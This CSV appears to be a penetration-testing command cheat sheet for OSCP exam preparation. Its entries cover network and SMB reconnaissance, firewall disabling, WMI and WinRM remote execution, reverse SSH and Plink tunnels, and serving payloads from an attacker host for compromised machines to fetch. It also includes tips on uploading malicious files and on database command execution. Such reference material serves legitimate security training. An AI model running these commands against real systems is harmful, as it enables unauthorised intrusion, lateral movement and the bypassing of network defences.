"id","name","category","command","description","subcategory","notes","oscp_relevance"
"nmap-ping-sweep","Network Ping Sweep","recon","nmap -sn <TARGET_SUBNET>","Discover live hosts on a network without port scanning","","Use -sn for host discovery only, no port scan","high"
"nmap-quick-scan","Quick Full Port Scan","recon","nmap -Pn -p- --min-rate=<RATE> <TARGET> -oA <OUTPUT>","Fast scan of all 65535 ports","","Adjust --min-rate based on network stability","high"
"nmap-service-scan","Service Version Detection","recon","nmap -sV -sC -p <PORTS> <TARGET> -oA <OUTPUT>","Detailed service enumeration with default scripts","","Use after quick scan to investigate open ports","high"
"nmap-vuln-scan","Vulnerability Scan","recon","nmap --script vuln -p <PORTS> <TARGET>","Run vulnerability detection scripts","","Can be slow, use specific scripts for better performance","medium"
"dns-enum","DNS Enumeration","recon","dnsrecon -d <DOMAIN> -t std","Standard DNS enumeration","","Try zone transfer with -t axfr if allowed","medium"
"smb-enum","SMB Enumeration","recon","enum4linux -a <TARGET>","Comprehensive SMB/NetBIOS enumeration","","Check for null sessions and guest access","high"
"snmp-enum","SNMP Enumeration","recon","snmpwalk -c <SNMP_COMMUNITY> -v2c <TARGET>","SNMP enumeration with community string","","Try 'public' and 'private' as default community strings","medium"
"smb-null-session-shares","SMB Null Session Share Enumeration","recon","smbclient -N -L //<TARGET>","Enumerate SMB shares using null session authentication (anonymous access without credentials)","","Null sessions often allowed on older Windows (pre-2000) and misconfigured Samba servers.

This is the first step in SMB enumeration - always try before authenticated methods.

Document all discovered shares in enumeration.md.

Time estimate:
1-2 minutes.

OSCP tip:
If null session works, try accessing IPC$ for further enumeration with rpcclient.","high"
"smb-enum4linux-full","Comprehensive SMB Enumeration with enum4linux","recon","enum4linux -a <TARGET>","Comprehensive SMB/NetBIOS enumeration including users, shares, groups, password policy, OS info, and workgroup details","","enum4linux wraps multiple Samba tools (smbclient, rpcclient, net).

Best used after confirming SMB is accessible.

Time estimate:
3-5 minutes for full scan.

Can be noisy - IDS may detect.

Document findings in enumeration.md:
workgroup name, users, shares, password policy (useful for credential attacks).

OSCP tip:
Look for shares with READ/WRITE access, weak password policies (no complexity, no lockout), and user lists for credential spraying.","high"
"smb-crackmapexec-shares","CrackMapExec SMB Share Enumeration","recon","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --shares","Enumerate SMB shares with authenticated access using CrackMapExec, showing detailed permission information","","CrackMapExec is faster than enum4linux for share enumeration with known credentials.

Shows explicit READ/WRITE permissions which is critical for exploitation planning.

Time estimate:
30 seconds.

OSCP tip:
Look for non-standard shares (anything besides C$, ADMIN$, IPC$) and shares with WRITE access - potential for uploading payloads.

For null session:
crackmapexec smb <TARGET> -u '' -p '' --shares.

For multiple targets:
crackmapexec smb <SUBNET> -u <USER> -p <PASS> --shares","high"
"smb-smbclient-connect","Interactive SMB Client Connection","recon","smbclient //<TARGET>/<SHARE> -U <USERNAME>","Connect interactively to an SMB share for manual file browsing, downloading, and uploading","","Interactive mode allows manual exploration which may reveal files missed by automated tools.

Common useful commands:
ls, cd, get, put, mget, mput, recurse, prompt.

Time estimate:
5-15 minutes for manual exploration.

OSCP tips:
(1) Check for readable files in Users directories - look for Desktop, Documents, Downloads.

(2) Check for writable directories - potential for malware upload.

(3) Look for configuration files, scripts, passwords in plaintext.

(4) For null session:
smbclient //<TARGET>/<SHARE> -N.

(5) For scripting:
smbclient //<TARGET>/<SHARE> -U <USER>%<PASS> -c 'ls;get file.txt'","high"
"smb-smbmap-recursive","Recursive SMB Share Content Enumeration","recon","smbmap -H <TARGET> -u <USERNAME> -p <PASSWORD> -R <SHARE>","Recursively list all files and directories within an SMB share with detailed permissions","","smbmap shows file sizes and permissions which helps prioritize targets.

Use -A flag with patterns to search for specific file types.

Time estimate:
2-5 minutes depending on share size.

OSCP tips:
(1) Look for READ/WRITE directories - potential pivot points.

(2) Common sensitive files:
passwords.txt, users.txt, config.xml, web.config, *.ps1, *.kdbx (KeePass), id_rsa (SSH keys).

(3) Use download:
smbmap -H <TARGET> -u <USER> -p <PASS> --download '<SHARE>\full\path\file.txt'.

(4) For null session:
smbmap -H <TARGET> -u '' -p ''.

(5) Recursively list ALL shares:
smbmap -H <TARGET> -u <USER> -p <PASS> -R (no share specified)","high"
"smb-mount-share","Mount SMB Share Locally","recon","sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD> //<TARGET>/<SHARE> <MOUNT_POINT>","Mount an SMB share to local filesystem for direct file access and manipulation using standard Linux tools","","Mounting allows using standard Linux tools (grep, find, cat, cp) instead of SMB-specific commands.

Much faster for bulk file operations.

Time estimate:
1 minute to mount.

OSCP tips:
(1) Always create mount point first:
sudo mkdir -p /mnt/smb.

(2) For null session:
username=guest,password='' or username='',password=''.

(3) For guest:
username=guest,password=guest.

(4) Unmount when done:
sudo umount <MOUNT_POINT>.

(5) Check what's mounted:
df -h | grep cifs.

(6) Force unmount if stuck:
sudo umount -f <MOUNT_POINT>.

(7) Use find for sensitive files:
find /mnt/smb -iname '*password*' -o -iname '*.config' -o -iname 'id_rsa'","high"
"curl-header-enum","HTTP Header Enumeration","recon","curl -I -X <METHOD> http://<TARGET>:<PORT>/<PATH>","Enumerate HTTP response headers to identify server technology, versions, and potential security misconfigurations","","Headers often reveal:
Server version (Apache/2.4.41), Backend technology (X-Powered-By:
PHP/7.4.3, ASP.NET), Framework (X-AspNet-Version), WAF presence (X-Sucuri-ID).

Time estimate:
10 seconds.

OSCP tips:
(1) Look for outdated versions - searchsploit material.

(2) X-Powered-By reveals backend language - useful for payload selection.

(3) Test OPTIONS method:
curl -I -X OPTIONS http://<TARGET> - may reveal PUT/DELETE allowed.

(4) Missing security headers = potential vulnerabilities:
X-Frame-Options, X-XSS-Protection, Content-Security-Policy.

(5) For HTTPS:
curl -I -k https://<TARGET> (bypass cert verification).

(6) Verbose for debugging:
curl -I -v http://<TARGET>","high"
"whatweb-technology-detection","Web Technology Fingerprinting","recon","whatweb -v -a 3 http://<TARGET>:<PORT>","Identify web technologies, CMS platforms, frameworks, JavaScript libraries, server info, and versions","","whatweb identifies:
CMS (WordPress, Joomla, Drupal), Web servers (Apache, nginx, IIS), Languages (PHP, ASP.NET, Python), Frameworks (Laravel, Django, Rails), JavaScript libraries (jQuery, Bootstrap), WAFs, Analytics.

Time estimate:
30-60 seconds.

OSCP tips:
(1) Prioritize CMS detection - WordPress/Joomla often have known vulns.

(2) Version numbers critical - check searchsploit immediately.

(3) For multiple URLs:
whatweb -i urls.txt.

(4) Check both HTTP and HTTPS:
whatweb http://<TARGET> https://<TARGET>.

(5) Look for development/staging indicators:
X-Debug, X-Error, verbose error messages.

(6) Admin panels:
/wp-admin (WordPress), /administrator (Joomla), /admin","high"
"vhost-fuzzing-gobuster","Virtual Host Discovery with Gobuster","recon","gobuster vhost -u http://<TARGET> -w <WORDLIST> -t <THREADS> --append-domain","Discover virtual hosts (subdomains) by fuzzing the Host header to find hidden web applications on the same IP","","Virtual hosts allow multiple websites on one IP address by routing based on Host header.

Often reveals development/staging environments with weaker security.

Time estimate:
2-5 minutes depending on wordlist size.

OSCP tips:
(1) Always try vhost fuzzing on web servers - hidden apps common in CTFs.

(2) Use quality wordlists:
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt.

(3) After finding vhosts, add to /etc/hosts for browsing:
<IP> subdomain.domain.com.

(4) Common vhosts in OSCP:
dev, staging, admin, api, internal, vpn, mail, blog.

(5) Compare response sizes - identical sizes across all attempts = wildcard response (filter with --exclude-length).

(6) For IP-based scanning:
gobuster vhost -u http://<IP> -w <WORDLIST> --domain target.com --append-domain","high"
"dns-zone-transfer-dig","DNS Zone Transfer Attempt","recon","dig axfr @<NAMESERVER> <DOMAIN>","Attempt DNS zone transfer (AXFR) to obtain complete DNS records including subdomains, IPs, and mail servers","","Zone transfers should be restricted to authorized secondary nameservers only, but misconfigurations still exist.

Successful transfer provides complete DNS records - massive information disclosure.

Time estimate:
30 seconds.

OSCP tips:
(1) Always try zone transfer first - when it works, it's instant enumeration.

(2) Find nameservers:
dig NS <DOMAIN> then try AXFR on each.

(3) Parse output for subdomains:
dig axfr @<NS> <DOMAIN> | grep -E '^[a-zA-Z0-9]' | awk '{print $1}'.

(4) Look for:
internal hosts, dev/staging servers, admin interfaces, mail servers, database servers.

(5) If transfer fails (common), fallback to:
gobuster dns, dnsrecon -t brt, fierce --domain <DOMAIN>.

(6) UDP port 53 required - check firewall:
sudo nmap -p 53 -sU -Pn <NS>","medium"
"iptables-list-rules","IPTables - List All Rules","post-exploitation","sudo iptables -L -v -n","Display all iptables firewall rules (Linux)","firewall","Run with sudo.

Use -t <table> to specify table (filter, nat, mangle, raw)","high"
"iptables-allow-port","IPTables - Allow Inbound Port","post-exploitation","sudo iptables -A INPUT -p <PROTOCOL> --dport <PORT> -j ACCEPT","Add iptables rule to allow inbound traffic on specific port","firewall","Rule is not persistent by default.

Use iptables-save to persist across reboots.","high"
"iptables-port-forward","IPTables - Port Forwarding","post-exploitation","sudo iptables -t nat -A PREROUTING -p <PROTOCOL> --dport <SRC_PORT> -j REDIRECT --to-port <DST_PORT>","Forward traffic from one port to another (port forwarding/redirect)","firewall","Useful for bypassing firewall restrictions or redirecting traffic through allowed ports","high"
"iptables-delete-rule","IPTables - Delete Rule by Number","post-exploitation","sudo iptables -D <CHAIN> <RULE_NUMBER>","Delete specific iptables rule by line number","firewall","Use --line-numbers to see rule numbers before deleting","medium"
"iptables-flush-all","IPTables - Flush All Rules","post-exploitation","sudo iptables -F","Remove all iptables rules (WARNING: may lock you out)","firewall","WARNING:
May lose SSH access if default policy is DROP.

Use with caution.","medium"
"ufw-status","UFW - Check Firewall Status","post-exploitation","sudo ufw status verbose","Display UFW (Uncomplicated Firewall) status and rules","firewall","UFW is the default firewall on Ubuntu/Debian systems","high"
"ufw-allow-port","UFW - Allow Port","post-exploitation","sudo ufw allow <PORT>/<PROTOCOL>","Allow inbound traffic on specific port","firewall","","high"
"ufw-disable","UFW - Disable Firewall","post-exploitation","sudo ufw disable","Disable UFW firewall (allows all traffic)","firewall","Rules are preserved but not enforced.

Use 'sudo ufw enable' to re-enable.","high"
"firewalld-list-all","Firewalld - List All Rules","post-exploitation","sudo firewall-cmd --list-all","Display all firewalld rules and zones","firewall","Firewalld is default on RHEL/CentOS/Fedora systems","medium"
"firewalld-add-port","Firewalld - Add Port Rule","post-exploitation","sudo firewall-cmd --zone=public --add-port=<PORT>/<PROTOCOL> --permanent","Allow inbound traffic on specific port","firewall","","medium"
"firewalld-port-forward","Firewalld - Port Forwarding","post-exploitation","sudo firewall-cmd --zone=public --add-forward-port=port=<SRC_PORT>:proto=<PROTOCOL>:toport=<DST_PORT> --permanent","Forward traffic from one port to another","firewall","","medium"
"netsh-firewall-show","Netsh - Show Firewall Status (Windows)","post-exploitation","netsh advfirewall show allprofiles","Display Windows firewall status and configuration","firewall","Requires Administrator privileges","high"
"netsh-firewall-show-state","Netsh - Show Firewall State (Legacy)","post-exploitation","netsh firewall show state","Show Windows firewall state (legacy command, works on older Windows)","firewall","Deprecated but still works on older Windows versions","medium"
"netsh-firewall-add-rule","Netsh - Add Firewall Allow Rule","post-exploitation","netsh advfirewall firewall add rule name=""<RULE_NAME>"" protocol=<PROTOCOL> dir=in localport=<PORT> action=allow","Add Windows firewall rule to allow inbound traffic","firewall","Requires Administrator privileges.

Rule persists across reboots.","high"
"netsh-firewall-port-forward","Netsh - Port Forwarding (Windows)","post-exploitation","netsh advfirewall firewall add rule name=""<RULE_NAME>"" protocol=<PROTOCOL> dir=in localip=<LOCAL_IP> localport=<SRC_PORT> action=allow","Forward traffic from one port to another on Windows","firewall","This allows firewall rule.

Use 'netsh interface portproxy' for actual port forwarding.","high"
"netsh-portproxy-add","Netsh - Add Port Proxy (Port Forward)","post-exploitation","netsh interface portproxy add v4tov4 listenport=<SRC_PORT> listenaddress=<LISTEN_IP> connectport=<DST_PORT> connectaddress=<DST_IP>","Create actual port forwarding/proxy rule on Windows","firewall","Useful for pivoting through compromised Windows hosts.

Firewall rule must be added separately.","high"
"netsh-portproxy-show","Netsh - Show Port Proxy Rules","post-exploitation","netsh interface portproxy show all","List all active port forwarding/proxy rules","firewall","","high"
"netsh-firewall-disable","Netsh - Disable Windows Firewall","post-exploitation","netsh advfirewall set allprofiles state off","Turn off Windows firewall for all profiles","firewall","Requires Administrator privileges.

Very obvious IoC - use with caution.","high"
"netsh-firewall-delete-rule","Netsh - Delete Firewall Rule","post-exploitation","netsh advfirewall firewall delete rule name=""<RULE_NAME>""","Remove specific firewall rule by name","firewall","Use to clean up custom rules after exploitation","medium"
"ps-wmi-invoke-method","PowerShell WMI Remote Process Creation","LATERAL_MOVEMENT","Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}","Create remote process via WMI using Invoke-CimMethod and Win32_Process class","WMI","",""
"ps-winrm-credential-setup","PowerShell WinRM Credential Object Setup","LATERAL_MOVEMENT","$username = '<USERNAME>'; $password = '<PASSWORD>'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString","Create PSCredential object for remote authentication via WinRM/PowerShell Remoting","WINRM","",""
"ps-wmi-cimsession-setup","PowerShell WMI CIM Session Creation","LATERAL_MOVEMENT","$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName <TARGET> -Credential $credential -SessionOption $options","Create CIM session for WMI-based lateral movement using DCOM protocol","WMI","",""
"ps-winrm-invoke-command","PowerShell WinRM Invoke-Command Remote Execution","LATERAL_MOVEMENT","Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}","Execute commands remotely via WinRM using Invoke-Command with credential object","WINRM","",""
"service-ssh-start-sysvinit","Start SSH Service (SysVinit)","pivoting","service ssh start","Start SSH daemon using SysVinit service manager on older systems","service-management","Legacy service management for older Linux distributions.

On systemd:
use 'systemctl start ssh' or 'systemctl start sshd'.

Service name varies:
ssh (Debian/Ubuntu), sshd (RedHat/CentOS).","medium"
"nmap-localhost-verification","Verify Listening Ports with Nmap","pivoting","nmap localhost","Scan localhost to verify which ports are externally accessible","port-verification","Verifies ports are listening AND accessible (firewall allows).

Internal verification:
use netstat/ss.

Useful after setting up tunnels or forwarding to confirm external accessibility.","medium"
"netstat-routing-table","View Routing Table with Netstat","pivoting","netstat -rn","Display kernel routing table in numeric format","network-reconnaissance","Shows default gateway, network routes, and interfaces.

Essential for identifying network segments during pivoting.

Modern alternative:
'ip route' or 'route -n'.","high"
"curl-http-service-verification","Verify HTTP Service Accessibility","pivoting","curl http://<TARGET>:<PORT>","Test HTTP connectivity to target service through tunnel or port forward","service-verification","Quick connectivity test after establishing tunnel or port forward.

Add -v for verbose connection details.

Use -x for testing through SOCKS proxy.","high"
"ssh-local-port-forward-inline","SSH Local Port Forward (Inline Syntax)","pivoting","ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>","Forward local port through SSH to access internal network service","port-forwarding","Local port forward:
bind local port that forwards to internal target.

Access via localhost:<LOCAL_PORT>.

Add -N to disable shell, -f for background.

Useful for accessing services on internal networks.","high"
"crackmapexec-smb-framework","CrackMapExec SMB Framework","pivoting","crackmapexec smb","Modern SMB enumeration and exploitation framework for lateral movement","lateral-movement","CrackMapExec (cme) is comprehensive toolkit for Active Directory enumeration, credential testing, and lateral movement.

Common usage:
cme smb <target> -u <user> -p <pass>.

Supports pass-the-hash, shares, command execution.","high"
"wmic-os-version-specific","Get Specific OS Version via WMIC","pivoting","wmic os get caption,version","Query specific Windows OS information using WMI","system-enumeration","WMIC deprecated in Windows 10 21H1+.

Modern alternative:
Get-CimInstance Win32_OperatingSystem.

Caption shows OS name, version shows build number.

Useful for identifying target OS quickly.","high"
"whoami-all-windows","Complete User Information (Windows)","pivoting","whoami /all","Display comprehensive user information including groups, privileges, and SID","user-enumeration","Shows username, SID, groups, privileges (enabled/disabled), and integrity level.

Essential for privilege escalation assessment.

Look for SeImpersonatePrivilege, SeBackupPrivilege, etc.","high"
"plink-remote-forward-microsocks","Plink Remote Forward with Microsocks","pivoting","plink -R <REMOTE_PORT>:127.0.0.1:<SOCKS_PORT> <SSH_USER>@<SSH_HOST>","Windows SSH remote port forward combined with microsocks for SOCKS proxy (workaround for OpenSSH <7.6)","socks-proxy","Workaround for old OpenSSH versions lacking -D dynamic forward.

Run microsocks locally on Windows, then use plink to forward that port back to attacker.

Attacker configures proxychains to use remote port.","medium"
"ip-route-ping-verification","Verify Pivot Routing Capability","pivoting","ip route && ping <DEST_IP>","Verify pivot host can route to destination network","network-verification","Combined check:
'ip route' shows routing table, ping tests connectivity.

Essential before setting up tunnels.

If ping fails but route exists, check firewall rules.","high"
"chisel-http-tunneling","Chisel HTTP Tunneling","pivoting","chisel","HTTP tunneling tool for port forwarding when SSH is blocked","tunneling","Chisel uses HTTP/HTTPS for tunneling (bypasses SSH blocks).

Server:
chisel server -p <port> --reverse.

Client:
chisel client <server>:<port> R:socks or R:<local>:<remote>:<port>.

Supports SOCKS and port forwarding.","high"
"test-netconnection-ssh-port","Test Outbound SSH Connectivity (PowerShell)","pivoting","Test-NetConnection <SSH_HOST> -Port 22","Verify firewall allows outbound SSH from Windows target","connectivity-testing","PowerShell cmdlet to test TCP connectivity.

Shows TcpTestSucceeded (true/false).

Useful before attempting plink reverse tunnels.

Alternative:
curl telnet://<host>:22","high"
"plink-remote-forward-windows","Plink Remote Port Forward","pivoting","plink -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> <SSH_USER>@<SSH_HOST>","Windows SSH client for reverse port forwarding (alternative to OpenSSH)","port-forwarding","Plink is PuTTY's CLI SSH client.

Use -R for reverse tunnels (expose internal port to attacker).

Add -N to disable shell.

Accept host key with -batch or echo y | plink ...","high"
"proxychains-config-verify","Verify Proxychains Configuration","pivoting","cat /etc/proxychains4.conf","Verify proxychains configuration has correct SOCKS proxy settings","proxy-configuration","Check [ProxyList] section at bottom:
'socks5 127.0.0.1 1080' (or your SOCKS port).

Ensure only one active proxy line.

Test with:
proxychains4 curl http://10.10.10.1","high"
"systemctl-start-ssh","Start SSH Server via Systemd","pivoting","sudo systemctl start ssh","Start OpenSSH server using systemd - required for receiving SSH tunnels from compromised hosts","ssh-tunneling","Critical OSCP technique:
Start SSH server on attack machine to receive reverse SSH tunnels from compromised Windows/Linux hosts.

Plink (Windows) and ssh (Linux) can connect back to this server to establish port forwarding.

Default Kali:
SSH server pre-installed but not started.

Always verify PasswordAuthentication yes in sshd_config if using passwords (keys preferred for OPSEC).

Use systemctl enable ssh to start at boot (optional).

Time estimate:
30 seconds.

Production:
Use key authentication only, disable password auth.","high"
"apache2-start","Start Apache Web Server","pivoting","sudo systemctl start apache2","Start Apache HTTP server - serve files from /var/www/html for file transfer to compromised hosts","file-transfer","Essential OSCP file transfer technique:
Serve exploits, payloads, enumeration scripts to compromised hosts.

Default web root:
/var/www/html/.

Common pattern:
cp LinEnum.sh /var/www/html/ → wget http://<LHOST>/LinEnum.sh on target.

Advantages over Python HTTP server:
Service management, logging, performance.

Disadvantage:
Requires root for port 80.

Alternative:
python3 -m http.server 8000 runs unprivileged on port 8000.

Always monitor /var/log/apache2/access.log to confirm target downloaded file.

Time estimate:
30 seconds.

Production:
Use TLS, authentication, non-standard ports.","high"
"ss-listening-ports","Display Listening Ports (ss)","pivoting","ss -ntplu","Display all listening TCP/UDP ports with process information - verify SSH/HTTP servers started and port forwards active","enumeration","Critical OSCP verification command:
Confirm SSH/Apache/port forwards are listening before attempting connections.

Modern replacement for netstat (faster, part of iproute2).

Common workflow:
Start service → ss -ntplu | grep :<PORT> → Verify process name matches.

Port forward debugging:
Check for 127.0.0.1:<REMOTE_PORT> entry to confirm tunnel established.

Process column shows which service owns each port - essential for troubleshooting port conflicts.

Output format:
State Recv-Q Send-Q Local_Address:Port Peer_Address:Port Process.

Time estimate:
5 seconds.

Alias tip:
alias ports='ss -ntplu' for quick access.","high"
"ip-addr","Display Network Interfaces","pivoting","ip addr","Display all network interfaces and assigned IP addresses - identify LHOST for reverse shells and tunnels","enumeration","Essential OSCP command:
Determine LHOST value for reverse shells and SSH tunnels.

Modern replacement for ifconfig.

Common pattern:
VPN connects → ip addr show tun0 → Note IP → Use in exploit payloads.

Interface states:
UP/DOWN in output.

IP format:
inet <IP>/<CIDR> brd <broadcast>.

IPv6 addresses shown as inet6.

Shorthand:
ip a (same as ip addr).

Output includes:
Link layer (MAC), IP layer (addresses), interface state (UP/DOWN/UNKNOWN).

Time estimate:
5 seconds.

OSCP critical:
Always verify tun0 IP before starting engagement.","high"
"ip-route","Display Routing Table","pivoting","ip route","Display kernel routing table - verify VPN routes and identify network topology for pivoting","enumeration","Important OSCP enumeration:
Understanding routing helps identify network topology and multi-homed pivot points.

Modern replacement for route -n.

Output format:
<destination> via <gateway> dev <interface> [proto <protocol>] [metric <priority>].

Scope link means directly connected network (no gateway).

Proto kernel means automatically added by kernel.

Pivoting use case:
On compromised host, ip route reveals other network segments accessible from that host - indicates potential pivot paths.

Time estimate:
5 seconds.

Production:
Static routes persist with /etc/network/interfaces or NetworkManager.","medium"
"nmap-port-check","Quick Port Verification (Nmap)","pivoting","sudo nmap -p <PORT> -Pn -v <TARGET>","Verify specific port is open and reachable - confirm SSH/HTTP server started or port forward active","enumeration","Critical OSCP verification technique:
Confirm services started before attempting connections.

Use cases:
1) Verify SSH server listening after systemctl start ssh, 2) Confirm port forward active after Plink/SSH tunnel, 3) Check HTTP server before wget from target, 4) Validate RDP access before xfreerdp.

Always use -Pn flag to skip ping (OSCP hosts often block ICMP).

Verbose (-v) provides progress feedback during scan.

Fast alternative for localhost:
nc -zv localhost <PORT>.

Time estimate:
2-5 seconds per port.

Production:
Use -sV for version detection, --script for vulnerability scanning.","high"
"psql-connect","PostgreSQL Client Connection","pivoting","psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>","Connect to PostgreSQL database server - enumerate databases, tables, and extract credentials after pivoting","database-access","Critical OSCP database enumeration technique:
Extract credentials, application data, and potentially execute commands with superuser privileges.

Common pivoting pattern:
Port scan reveals 5432 internal → SSH local port forward → psql to 127.0.0.1 → Dump credentials.

PostgreSQL superuser capabilities:
COPY TO PROGRAM for command execution (9.3+), COPY FROM for file reading, CREATE EXTENSION for loading malicious libraries.

Metafile commands:
\l (databases), \dt (tables), \du (users), \d <table> (describe), \c <db> (switch database), \q (quit).

Default credentials to try:
postgres:postgres, postgres:<blank>, admin:admin.

Time estimate:
1-2 minutes for initial enumeration.

Production:
Always use SSL, restrict pg_hba.conf, disable superuser remote access.","high"
"smbclient-list-shares","SMB Share Enumeration (No Auth)","pivoting","smbclient -N -L //<TARGET>","List SMB shares without authentication (null session) - discover accessible shares for file enumeration","smb-enumeration","Essential OSCP SMB enumeration technique:
Null sessions reveal share names without credentials - often exposes sensitive files, backup configs, or writable directories for payload upload.

Null sessions common on:
Windows 2000/XP/2003, misconfigured Windows 7/2008.

Modern Windows (10/2019+) disables null sessions by default.

Common share names:
ADMIN$ (C:\Windows), C$ (C:\), IPC$ (inter-process communication), NETLOGON, SYSVOL (domain controllers), Users, Backups, Public.

Writable share use case:
Upload malicious file → Execute via RCE vulnerability.

Time estimate:
5-10 seconds.

Production:
Always disable null sessions, restrict share permissions, use SMB signing.","high"
"netsh-portproxy-delete","Netsh Delete Port Forward","pivoting","netsh interface portproxy delete v4tov4 listenport=<LISTEN_PORT> listenaddress=<LISTEN_IP>","Remove netsh port forwarding rule - cleanup after pivoting","windows-tunneling","Critical for cleanup in OSCP exam - remove port forwards to avoid leaving persistent backdoors.

Also delete associated firewall rules with netsh-firewall-delete-rule.

For complete cleanup:
netsh interface portproxy reset (removes all rules).","medium"
"where-windows","Where - Find Executable","pivoting","where <EXECUTABLE>","Locate executable in Windows PATH - verify tool availability","enumeration","Quick check for tool availability.

Common OSCP checks:
where ssh (OpenSSH client), where python, where powershell, where curl.

Equivalent to Linux 'which' command.","medium"
"systeminfo-windows","System Information","pivoting","systeminfo","Display detailed Windows system information - OS version, patches, network config","enumeration","Critical OSCP enumeration command.

Check:
OS version (for exploit research), Hotfix list (missing patches = vulnerabilities), Network adapters (multi-homed = pivot candidate), System Type (32-bit vs 64-bit for exploit selection).

Time estimate:
5-10 seconds for output.","high"
"whoami-priv","Whoami Privileges","pivoting","whoami /priv","Display current user privileges - check for admin rights and dangerous privileges","enumeration","Critical for privilege escalation assessment.

Key privileges:
SeImpersonatePrivilege (Potato exploits), SeDebugPrivilege (process injection), SeBackupPrivilege (backup file access), SeRestorePrivilege (file restore), SeLoadDriverPrivilege (driver loading).

If high-value privilege present, search for corresponding exploit.

Time estimate:
immediate.","high"
"ipconfig-all","IP Configuration All","pivoting","ipconfig /all","Display detailed network configuration - identify dual-homed hosts and internal subnets","enumeration","Critical OSCP enumeration for pivot identification.

Look for:
Multiple network adapters (dual-homed = pivot candidate), Internal IP ranges (10.x, 172.16-31.x, 192.168.x = potential pivot targets), DNS servers (identify domain controllers).

Common pattern:
Host has 192.168.45.x (WAN) and 172.16.50.x (internal) = perfect pivot point.

Time estimate:
immediate.","high"
"netstat-windows","Netstat Network Connections","pivoting","netstat -ano","Display all network connections and listening ports with process IDs - enumerate services","enumeration","Critical for service enumeration and port forward verification.

Use cases:
Identify listening ports (potential services), Find established connections (active pivots), Verify port forward active (netstat -ano | findstr <PORT>), Map PID to process (tasklist | findstr <PID>).

Combine with netsh-portproxy-show to see full pivot configuration.

Time estimate:
immediate.","high"
"ssh-local-port-forward","SSH Local Port Forward","pivoting","ssh -N -L <BIND_ADDRESS>:<LOCAL_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_HOST>","Create SSH local port forward - listening port on SSH client forwards through tunnel to destination","ssh_tunneling","Local port forward limitation:
One socket per -L flag.

For multiple services, use multiple -L flags in single SSH command or use dynamic port forward (-D) with SOCKS proxy.

Common OSCP use case:
Access internal database/SMB from Kali through compromised DMZ host.","high"
"ssh-dynamic-port-forward","SSH Dynamic Port Forward (SOCKS Proxy)","pivoting","ssh -N -D <BIND_ADDRESS>:<SOCKS_PORT> <SSH_USER>@<SSH_HOST>","Create SSH dynamic port forward - SOCKS proxy on SSH client for flexible multi-destination tunneling","ssh_tunneling","Dynamic forward creates SOCKS5 proxy supporting multiple concurrent connections.

More flexible than local forward (-L) which requires separate tunnel per destination.

Common OSCP pattern:
Use for internal network enumeration (nmap through proxychains), then switch to local forward for specific services.

Proxychains limitation:
TCP only, no UDP/ICMP support.","high"
"ssh-remote-port-forward","SSH Remote Port Forward (Reverse Tunnel)","pivoting","ssh -N -R <BIND_ADDRESS>:<REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_USER>@<SSH_SERVER>","Create SSH remote port forward - reverse tunnel binding port on SSH server, forwarding from compromised client","ssh_tunneling","Remote port forward reverses connection direction - critical for firewall bypass.

Listening port on attacker-controlled SSH server, forwarding done by SSH client on compromised host.

Use when inbound connections to compromised host blocked.

GatewayPorts security note:
Enabling in hostile networks allows anyone on SSH server's network to access forwarded port - bind to 127.0.0.1 when possible.","high"
"ssh-remote-dynamic-port-forward","SSH Remote Dynamic Port Forward (Reverse SOCKS)","pivoting","ssh -N -R <SOCKS_PORT> <SSH_USER>@<SSH_SERVER>","Create SSH remote dynamic port forward - reverse SOCKS proxy on SSH server for firewall bypass with multi-destination flexibility","ssh_tunneling","Remote dynamic forward combines reverse tunnel (firewall bypass) with SOCKS proxy (multi-destination flexibility).

Requires OpenSSH ≥7.6 on compromised client (Windows 1803+ has version 8.1+, most modern Linux has ≥7.6).

Syntax difference:
Normal remote forward includes destination (-R port:host:hostport), remote dynamic only has port (-R port).

Critical OSCP technique for enumeration through firewalled pivot points.","high"
"socat-port-forward","Socat TCP Port Forward","pivoting","socat -ddd TCP-LISTEN:<LOCAL_PORT>,fork TCP:<DEST_IP>:<DEST_PORT>","Create simple TCP port forward using Socat - no encryption, no authentication, single command relay","port_forwarding","Socat simpler than SSH tunneling but lacks encryption and authentication.

Useful for quick port forwards when security less critical or SSH unavailable.

Limitation:
One listening port per Socat process - need separate process for each port forward.

Common OSCP use case:
Quick access to internal database when Socat already installed on compromised host.

For production:
Use SSH tunneling for encrypted, authenticated forwarding.","medium"
"plink-remote-forward","Plink Remote Port Forward","pivoting","plink.exe -ssh -l <SSH_USER> -pw <SSH_PASSWORD> -R <REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_HOST>","Create reverse SSH tunnel using Plink (PuTTY CLI) on Windows - bypass firewall by initiating connection from compromised host","ssh-tunneling","Plink is PuTTY's command-line interface - ideal for Windows hosts without OpenSSH.

Unlike OpenSSH's ssh.exe, Plink supports password on command line with -pw (bad OPSEC but useful for scripts).

Critical OSCP technique:
Reverse tunnel allows pivot through firewall blocking inbound connections.

Alternative authentication:
Use -i <keyfile.ppk> for Putty private key (convert from OpenSSH with puttygen).

Production:
Use SSH keys, not passwords.

Time estimate:
3-5 minutes including file transfer.","high"
"xfreerdp-connect","xFreeRDP Connection","pivoting","xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard","Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass","remote-access","xFreeRDP is the standard Linux RDP client for OSCP.

Clipboard sharing critical for file transfer when no other options available.

Drive sharing with +drive:share,/path mounts local directory as \\tsclient\share in Windows - alternative to SMB/HTTP servers.

Common OSCP pattern:
RDP into dual-homed Windows host, then set up SSH/Plink tunnel to access internal network.

Time estimate:
1-2 minutes for connection.","high"
